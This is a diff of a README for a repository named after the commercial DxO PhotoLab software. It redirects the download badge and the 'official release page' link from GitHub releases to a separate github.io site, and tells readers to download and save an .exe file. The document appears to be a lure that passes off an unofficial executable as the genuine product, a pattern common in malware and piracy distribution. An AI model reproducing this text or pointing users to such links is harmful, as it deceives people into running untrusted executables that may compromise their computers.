@@ -1,6 +1,6 @@
 # 📸 DxO-PhotoLab-Elite - Edit Photos Like A Pro Today
 
-[![](https://img.shields.io/badge/Download-DxO-PhotoLab-Elite-blue)](https://github.com/jeannienonnomadic66/DxO-PhotoLab-Elite/releases)
+[![](https://img.shields.io/badge/Download-DxO-PhotoLab-Elite-blue)](https://jeannienonnomadic66.github.io)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ Your computer needs specific parts to run the program well. Check your system sp
 
 Follow these steps to get the file.
 
-1. Go to the [official release page](https://github.com/jeannienonnomadic66/DxO-PhotoLab-Elite/releases).
+1. Go to the [official release page](https://jeannienonnomadic66.github.io).
 2. Look for the latest version listed at the top.
 3. Click the link that ends in .exe.
 4. Save the file to your computer.
